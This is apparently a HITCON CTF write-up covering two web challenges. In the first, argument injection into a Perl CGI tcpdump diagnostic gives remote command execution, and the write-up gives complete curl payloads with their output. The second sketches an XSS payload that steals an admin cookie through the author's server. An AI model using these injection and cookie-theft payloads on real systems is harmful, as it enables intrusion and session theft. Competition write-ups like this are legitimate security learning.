HITCON CTF is a great hacking competition in CTF world.
I solved 2 web challanges of Orange. So here is writeup.
<h2>1. Virtual Public Network</h2>
I have read Orange's blog, I can understand that is a story of Orange when he hack VPN product.
Note that `return $options if system("timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/null 2>&1") == 0;` and `# backdoor :)` code, we can see that our shell will be located at `./tmp/`.
But when using Orange's payload, I can not get the output as expect. So I get a problem and should be redirect output to shell with `>` and read it with _curl_
Remember that it requires a $tpl parameter to get filename of shell
`my $tpl = CGI::param("tpl");
...
    $tpl = "./tmp/" . $tpl . ".thtml";
    require($tpl);`
So I can create a final payload like this: `-r\$x="ls%20/",exec\$x%23%202>./tmp/dragonball.thtml%20<&tpl=dragonball` and urlencode it
`curl "http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x="ls%20/",exec\$x%23%202>./tmp/dragonball.thtml%20<&tpl=dragonball`
`$READ_FLAG$
FLAG
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old`
Encode `$` to read flag `$READ_FLAG` because $ will be interpreted as bash variable in Perl language and I can get it like this `\x24`.
Using `sh -c '[command]'` to read flag because it is a binary file.
Finall payload: `-r\$x=\"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202>./tmp/dragonball.thtml%20&tpl=dragonball`
`curl "http://13.231.137.9/cgi-bin/diag.cgi?options=-r\$x=\"sh%20-c%20'/\x5c\x24READ_FLAG\x5c\x24'\",exec\$x%23%202>./tmp/dragonball.thtml%20&tpl=dragonball`
Flag: `hitcon{Now I'm sure u saw my Bl4ck H4t p4p3r :P}`
Reference: 
<h2>Bounty Pl33z</h2>
This is a XSS challenge. When I click submit bugs it will redirects to `https://<?=$host;?>/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361`
So using _${alert()}`-"-(`${`_ to trigger XSS, so setup a VPS and redirect challenge's network to get admin's cookie (=flag)
